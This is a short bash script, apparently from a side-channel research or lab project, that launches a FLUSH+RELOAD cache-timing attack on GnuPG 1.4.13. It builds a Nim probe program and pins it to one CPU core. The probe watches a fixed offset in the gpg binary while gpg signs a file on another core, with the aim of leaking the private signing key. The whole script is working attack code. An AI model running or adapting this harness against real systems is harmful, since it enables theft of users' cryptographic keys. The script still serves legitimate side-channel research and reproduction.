#!/bin/bash
# Script to run FLUSH+RELOAD on GnuPG

export GNUPGHOME="${PWD}/gnupg-1.4.13/home/"

GNUPG="./gnupg/install/bin/gpg"
SFILE="README.md"

rm -f "${SFILE}.sig"

nimble build -d:release >&2

taskset 0x1 ./flush_reload_test \
    -n:100000 -d:1500 \
    "${GNUPG}" \
    662000 \
    &
taskset 0x2 "${GNUPG}" --sign --detach-sig "${SFILE}" >&2

rm -f "${SFILE}.sig"
